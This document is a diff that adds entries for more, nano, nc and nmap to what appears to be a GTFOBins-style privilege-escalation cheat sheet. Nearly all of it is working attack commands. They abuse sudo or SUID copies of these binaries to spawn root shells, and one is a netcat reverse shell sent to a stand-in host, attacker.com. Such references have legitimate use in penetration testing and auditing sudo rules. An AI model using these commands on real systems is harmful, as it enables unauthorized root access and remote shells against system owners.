@@ -69,3 +69,55 @@ sudo sh -c 'cp $(which less) .; chmod +s ./less'
 sudo man man
 !/bin/sh
 ```
+# MORE
+### SUDO
+```
+TERM= sudo -E more /etc/profile
+!/bin/sh
+```
+### SUID
+```
+sudo sh -c 'cp $(which more) .; chmod +s ./more'
+
+./more file_to_read
+```
+
+# NANO
+### SUDO
+```
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+### SUID
+```
+sudo sh -c 'cp $(which nano) .; chmod +s ./nano'
+
+./nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+# NC
+### SUDO
+```
+# Run nc -l -p 12345 on the attacker box to receive the shell. This only works with netcat traditional.
+
+RHOST=attacker.com
+RPORT=12345
+sudo nc -e /bin/sh $RHOST $RPORT
+```
+
+# NMAP
+### SUDO
+```
+#   Input echo is disabled.
+
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF
+
+#   The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+
+sudo nmap --interactive
+nmap> !sh
+```
